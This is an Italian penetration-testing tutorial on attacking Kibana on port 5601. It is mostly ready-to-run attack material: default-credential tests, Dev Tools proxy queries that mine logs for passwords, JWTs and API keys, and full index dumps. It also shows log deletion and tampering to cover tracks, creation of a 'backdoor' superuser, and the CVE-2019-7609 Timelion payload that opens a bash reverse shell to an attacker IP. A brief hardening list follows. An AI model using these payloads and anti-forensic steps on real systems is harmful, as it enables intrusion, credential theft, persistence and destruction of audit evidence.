---
title: 'Porta 5601 Kibana: Dev Tools, Log Leak e Elasticsearch'
slug: porta-5601-kibana
description: >-
  Porta 5601 Kibana nel pentest: Dev Tools Console, query Elasticsearch,
  exposure dei log, host interni e credenziali sensibili nei dati indicizzati
image: /porta-5601-kibana.webp
draft: false
date: 2026-04-15T00:00:00.000Z
categories:
  - networking
subcategories:
  - porte
tags:
  - Kibana
  - Dev Tools Console
  - Elasticsearch
---

Kibana è l'interfaccia web di visualizzazione dello stack Elastic (ELK: Elasticsearch, Logstash, Kibana). Ascolta sulla porta 5601 TCP e fornisce dashboard interattive, query sui dati indicizzati in Elasticsearch e strumenti di amministrazione. Nel penetration testing, un Kibana esposto è una miniera di informazioni: i log indicizzati in Elasticsearch contengono credenziali in chiaro (login falliti con password nei parametri URL, header Authorization, token API), hostname e IP interni, path delle applicazioni, query SQL e molto altro. Ma Kibana non è solo un viewer passivo — la sua Dev Tools console è un proxy diretto verso [Elasticsearch](https://hackita.it/articoli/porta-9200-elasticsearch) con tutti i poteri della REST API: dump indici, modifica dati, creazione utenti. E le CVE di Kibana includono RCE pre-auth tramite prototype pollution.

In un'infrastruttura ELK tipica, Kibana raccoglie i log di **tutti** i servizi: web server, applicazioni, firewall, VPN, autenticazione — è il punto di osservazione più completo sulla rete.

## Architettura ELK

```
Servizi (log sources)          Logstash          Elasticsearch        Kibana (:5601)
┌─────────────┐               ┌──────┐          ┌─────────────┐     ┌─────────────┐
│ Apache/Nginx│── log ───────►│      │          │ :9200       │     │ Web UI      │
│ SSH/VPN     │── log ───────►│Parse │── bulk──►│ Indici:     │◄───►│ Dashboard   │
│ App/API     │── log ───────►│Filter│  insert  │  logs-*     │     │ Dev Tools   │
│ Firewall    │── log ───────►│      │          │  metrics-*  │     │ Discover    │
└─────────────┘               └──────┘          │  apm-*      │     │ Management  │
                                                └─────────────┘     └─────────────┘
```

| Porta    | Servizio                | Default auth                   |
| -------- | ----------------------- | ------------------------------ |
| **5601** | Kibana Web UI           | Nessuna (OSS) / Basic (X-Pack) |
| 9200     | Elasticsearch REST API  | Nessuna (OSS)                  |
| 9300     | Elasticsearch transport | Nessuna                        |
| 5044     | Logstash Beats input    | Nessuna                        |

## 1. Enumerazione

### Nmap

```bash
nmap -sV -p 5601 10.10.10.40
```

```
PORT     STATE SERVICE VERSION
5601/tcp open  http    Kibana (Elastic)
```

### Accesso alla Web UI

```bash
curl -s http://10.10.10.40:5601/ -I
```

```
HTTP/1.1 200 OK
kbn-name: kibana
kbn-version: 8.11.3
```

**Header `kbn-version`** → versione esatta di Kibana. Cerca CVE.

### Status API

```bash
curl -s http://10.10.10.40:5601/api/status | python3 -m json.tool
```

```json
{
    "name": "kibana-prod-01",
    "uuid": "abc123...",
    "version": {"number": "8.11.3"},
    "status": {
        "overall": {"level": "available"},
        "core": {"elasticsearch": {"level": "available"}}
    }
}
```

**Intelligence:** hostname (`kibana-prod-01`), versione, stato di Elasticsearch (connesso).

### Spazi e indici disponibili

```bash
# Lista spazi Kibana
curl -s http://10.10.10.40:5601/api/spaces/space

# Lista indici via Kibana Dev Tools API
curl -s http://10.10.10.40:5601/api/console/proxy -H "kbn-xsrf: true" \
  -H "Content-Type: application/json" \
  -d '{"method":"GET","path":"_cat/indices?v"}'
```

## 2. Credenziali e Accesso

### Senza autenticazione (Kibana OSS / X-Pack trial)

Molte installazioni Kibana (specialmente la versione OSS o con X-Pack non configurato) non richiedono autenticazione. Apri `http://10.10.10.40:5601` nel browser → accesso diretto a tutte le dashboard e dati.

### Default credentials (con X-Pack Security)

| Username        | Password   | Ruolo          |
| --------------- | ---------- | -------------- |
| `elastic`       | `changeme` | Superuser      |
| `elastic`       | `elastic`  | Superuser      |
| `kibana_system` | `changeme` | Kibana interno |

```bash
# Test
curl -s -u "elastic:changeme" http://10.10.10.40:5601/api/status
```

### Credenziali nel file di configurazione

```bash
# Se hai accesso al filesystem del server Kibana
cat /etc/kibana/kibana.yml | grep -i password
```

```yaml
elasticsearch.username: "kibana_system"
elasticsearch.password: "K1bana_Pr0d_2025!"
```

Queste credenziali si connettono a Elasticsearch → usale per accesso diretto alla porta 9200.

## 3. Dev Tools Console — Proxy verso Elasticsearch

La sezione **Dev Tools** di Kibana è un proxy completo verso la REST API di Elasticsearch. Qualsiasi cosa puoi fare con `curl` sulla porta 9200, la puoi fare da qui — anche se la 9200 non è esposta.

### Query fondamentali (da Dev Tools o via API proxy)

```bash
# Via API proxy (da fuori)
# Ogni comando sotto può essere eseguito come:
curl -s http://10.10.10.40:5601/api/console/proxy \
  -H "kbn-xsrf: true" -H "Content-Type: application/json" \
  -d '{"method":"GET","path":"ENDPOINT"}'
```

```
# Versione Elasticsearch
GET /

# Lista indici
GET _cat/indices?v&s=store.size:desc

# Cluster health
GET _cluster/health

# Nodi del cluster
GET _cat/nodes?v
```

```
health status index              docs.count store.size
green  open   logs-nginx-2026.01  15234567   12.3gb
green  open   logs-app-2026.01     8765432    5.1gb
green  open   logs-auth-2026.01    3456789    2.8gb
green  open   apm-7.17.0-2026.01   234567    890mb
green  open   .kibana_1                 45    256kb
```

Quattro indici di log + APM. `logs-auth` è il più interessante per credenziali.

### Ricercare credenziali nei log

```json
// Cerca "password" nei log di autenticazione
GET logs-auth-*/_search
{
  "query": {
    "query_string": {
      "query": "password OR passwd OR secret OR token OR api_key OR authorization"
    }
  },
  "size": 100
}
```

```json
// Log di login falliti (spesso contengono la password nei parametri)
GET logs-nginx-*/_search
{
  "query": {
    "query_string": {
      "query": "401 AND (password OR passwd OR login)"
    }
  }
}
```

**Cosa cercare nei log:**

* **URL con credenziali**: `GET /login?user=admin&password=Corp2025!` → log del web server
* **Header Authorization**: `Authorization: Basic dXNlcjpwYXNzd29yZA==` → base64 decode
* **Token JWT**: `Bearer eyJ...` → decode su jwt.io, può contenere ruoli e claim sensibili
* **API keys**: `X-API-Key: ak_live_abc123...` → accesso alle API
* **Errori applicativi**: stack trace con path filesystem, configurazioni, variabili d'ambiente

```json
// Cerca JWT tokens
GET logs-*/_search
{
  "query": {
    "query_string": {
      "query": "Bearer OR JWT OR eyJ"
    }
  },
  "size": 50
}
```

```json
// Cerca query SQL nei log applicativi (possono rivelare struttura DB)
GET logs-app-*/_search
{
  "query": {
    "query_string": {
      "query": "SELECT OR INSERT OR UPDATE OR jdbc"
    }
  }
}
```

### Dump di un intero indice

```json
// Scarica tutti i documenti (usa scroll per indici grandi)
GET logs-auth-2026.01/_search
{
  "query": {"match_all": {}},
  "size": 10000
}
```

```bash
# Da CLI con elasticdump (più efficiente per indici grandi)
elasticdump --input=http://10.10.10.40:9200/logs-auth-2026.01 --output=auth_logs.json --type=data
```

### Hostname e IP interni dalla topologia

```json
// I log contengono gli hostname dei server
GET logs-*/_search
{
  "aggs": {
    "hosts": {
      "terms": {"field": "host.name.keyword", "size": 100}
    }
  },
  "size": 0
}
```

```json
{
  "buckets": [
    {"key": "web-01.corp.internal", "doc_count": 5000000},
    {"key": "api-01.corp.internal", "doc_count": 3000000},
    {"key": "db-01.corp.internal", "doc_count": 1500000},
    {"key": "jenkins-01.corp.internal", "doc_count": 500000}
  ]
}
```

Mappa completa dei server con hostname → nuovi target per la scansione.

## 4. Modifica Dati — Coprire le Tracce (Red Team)

Se hai accesso write:

```json
// Elimina i log delle tue attività
POST logs-auth-2026.01/_delete_by_query
{
  "query": {
    "match": {"source.ip": "10.10.10.200"}
  }
}
```

```json
// Modifica un log per alterare l'evidenza
POST logs-auth-2026.01/_update/DOC_ID
{
  "doc": {
    "source.ip": "192.168.1.1",
    "message": "Successful login from internal"
  }
}
```

Questo distrugge l'integrità dei log — critico per il blue team. Se Kibana non ha auth, chiunque può farlo.

## 5. CVE e RCE su Kibana

### CVE-2019-7609 — Prototype Pollution RCE (Kibana \< 6.6.1)

Esecuzione codice arbitraria tramite la funzione Timelion di Kibana:

```
.es(*).props(label.__proto__.env.AAAA='require("child_process").exec("bash -c \'bash -i >& /dev/tcp/10.10.10.200/4444 0>&1\'");process.exit()//')
.es(*).props(label.__proto__.env.NODE_OPTIONS='--require /proc/self/environ')
```

Vai su **Timelion** → incolla il payload → fai Canvas render → reverse shell come utente kibana. Pre-auth se Kibana non ha autenticazione.

### CVE-2021-22145 — Info Disclosure (Kibana 7.x)

Leakage di credenziali Elasticsearch e configurazione.

### CVE-2023-31415 — RCE via Connector (Kibana 8.x)

Esecuzione di codice tramite connettori malconfigurati.

```bash
# Cerca CVE per la versione specifica
searchsploit kibana
searchsploit elastic
```

## 6. SSRF — Da Kibana a Elasticsearch Interno

Se la porta 9200 di Elasticsearch non è esposta ma Kibana sì, Kibana funziona come proxy:

```bash
# Kibana si connette a ES internamente
# Il Dev Tools proxy inoltra le richieste
# → accesso completo a Elasticsearch tramite Kibana
```

Questo significa che anche se il firewall blocca la 9200, hai pieno accesso a Elasticsearch via Kibana sulla 5601.

```json
// Crea un utente superuser in Elasticsearch (se X-Pack Security)
PUT _security/user/backdoor
{
  "password": "BackD00r_2025!",
  "roles": ["superuser"]
}
```

## 7. Detection & Hardening

* **Autenticazione obbligatoria** — abilita X-Pack Security con credenziali forti
* **Non esporre Kibana su Internet** — sempre dietro VPN o reverse proxy con auth
* **RBAC** — ruoli granulari, utenti di sola lettura per dashboard, admin separato
* **Disabilita Dev Tools** per utenti non-admin: `console.enabled: false` in kibana.yml
* **Firewall** — porta 5601 solo da IP di analisti
* **Patch** — le CVE Kibana sono frequenti e spesso pre-auth RCE
* **Audit logging** — abilita audit log in Elasticsearch per monitorare query sospette
* **Non loggare credenziali** — configura Logstash per sanitizzare password e token dai log
* **TLS** tra Kibana e Elasticsearch

## 8. Cheat Sheet Finale

| Azione           | Comando                                                                   |
| ---------------- | ------------------------------------------------------------------------- |
| Nmap             | `nmap -sV -p 5601 target`                                                 |
| Version          | `curl -s http://target:5601/ -I \| grep kbn-version`                      |
| Status           | `curl -s http://target:5601/api/status`                                   |
| Default creds    | `elastic:changeme`, `elastic:elastic`                                     |
| Lista indici     | `GET _cat/indices?v` (Dev Tools)                                          |
| Cerca password   | `GET logs-*/_search {"query":{"query_string":{"query":"password"}}}`      |
| Cerca token      | `GET logs-*/_search {"query":{"query_string":{"query":"Bearer OR JWT"}}}` |
| Hostname interni | `GET logs-*/_search` con aggregazione `host.name.keyword`                 |
| Dump indice      | `GET index/_search {"size":10000}`                                        |
| Timelion RCE     | CVE-2019-7609 prototype pollution                                         |
| Searchsploit     | `searchsploit kibana elastic`                                             |

***

Riferimento: Elastic Security documentation, CVE-2019-7609, HackTricks Kibana/Elasticsearch. Uso esclusivo in ambienti autorizzati. [https://hackviser.com/tactics/pentesting/services/kibana](https://hackviser.com/tactics/pentesting/services/kibana)

> [hackita.it/supporto](https://hackita.it/supporto) — [hackita.it/servizi](https://hackita.it/servizi).
